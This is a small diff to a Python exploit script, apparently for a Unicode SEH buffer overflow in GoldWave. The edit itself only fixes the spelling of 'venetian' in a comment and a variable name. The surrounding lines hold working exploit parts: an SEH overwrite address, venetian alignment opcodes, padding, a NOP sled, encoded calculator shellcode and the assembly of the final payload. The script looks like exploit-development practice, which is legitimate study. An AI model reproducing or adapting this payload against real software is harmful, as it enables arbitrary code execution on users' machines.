@@ -12,9 +12,9 @@ seh = "\x0f\x6d" # Unicode POP POP RETN from GoldWave.exe
 
 # ebx is the register closest to our shellcode following the popad 
 # maybe
-# took the venterian alignment from https://nutcrackerssecurity.github.io/Windows5.html 
-# because i'm still learning to write this manually
-venterian_alignment = (
+# took the venetian alignment from https://nutcrackerssecurity.github.io/Windows5.html 
+# because i'm still learning to understand this
+venetian_alignment = (
 "\x53" 					#push ebx
 "\x47" 					#align
 "\x58" 					#pop eax
@@ -41,7 +41,7 @@ shellcode_calc += "LM6SLLJE0KK9PCEKUWKOWMCSBRO2JKPR3KO9ERC1QRL1SNN1U3H35M0AA"
 payload = "\x41" * 1019
 payload += nseh
 payload += seh
-payload += venterian_alignment
+payload += venetian_alignment
 payload += "\x90" * 365
 payload += shellcode_calc
 payload += "D" * 8000
